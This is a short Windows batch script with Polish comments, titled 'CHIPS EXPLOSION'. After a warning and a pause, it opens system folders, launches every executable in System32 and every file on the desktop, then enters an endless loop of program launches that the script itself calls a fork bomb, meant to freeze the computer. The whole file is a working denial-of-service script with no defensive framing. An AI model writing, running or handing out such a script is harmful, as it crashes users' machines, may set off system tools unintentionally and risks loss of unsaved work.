@echo off
title CHIPS EXPLOSION
color 0c

echo [!] UWAGA: Zaraz otworze WSZYSTKO co znajde na dysku C:
echo [!] To ZAWIESI Twoj komputer w kilka sekund.
pause

:: --- 1. OTWIERANIE DYSKOW I FOLDEROW ---
start C:\
start %SystemRoot%
start %SystemRoot%\System32
start %UserProfile%\Pulpit

:: --- 2. OTWIERANIE WSZYSTKICH PROGRAMOW Z SYSTEM32 ---
:: To jest najbardziej zabojcze - otworzy setki procesow naraz
cd /d %SystemRoot%\System32
for %%f in (*.exe) do (
    echo Otwieram: %%f
    start %%f
)

:: --- 3. SZUKANIE I OTWIERANIE NA PULPICIE ---
cd /d "%UserProfile%\Pulpit"
for %%g in (*.*) do (
    start %%g
)

:: --- 4. PETLA SMIERCI (FORK BOMB) ---
:: Jesli komputer jeszcze dycha, to teraz przestanie
:payload
start explorer.exe
start calc.exe
start notepad.exe
start mspaint.exe
goto payload
